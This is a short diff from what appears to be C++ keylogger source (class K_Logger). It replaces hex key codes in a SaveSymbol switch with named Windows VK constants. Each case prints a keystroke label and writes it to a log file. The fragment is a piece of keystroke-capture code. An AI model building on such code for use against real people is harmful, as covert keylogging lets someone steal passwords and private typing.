@@ -739,27 +739,27 @@ int K_Logger::SaveSymbol(WORD iKey)
 			WriteToFile(" btn_down ");
 			break;
 
-		case 0x25:
+		case VK_LEFT:
 			std::cout << " btn_left ";
 			WriteToFile(" btn_left ");
 			break;
 
-		case 0x27:
+		case VK_RIGHT:
 			std::cout << " btn_right ";
 			WriteToFile(" btn_right ");
 			break;
 
-		case 0x11:
+		case VK_CONTROL:
 			std::cout << " btn_ctrl ";
 			WriteToFile(" btn_ctrl ");
 			break;
 
-		case 0x2D:
+		case VK_INSERT:
 			std::cout << " Insert ";
 			WriteToFile(" Insert ");
 			break;
 
-		case 0x2E:
+		case VK_DELETE:
 			std::cout << " *Delete* ";
 			WriteToFile(" Delete ");
 			break;
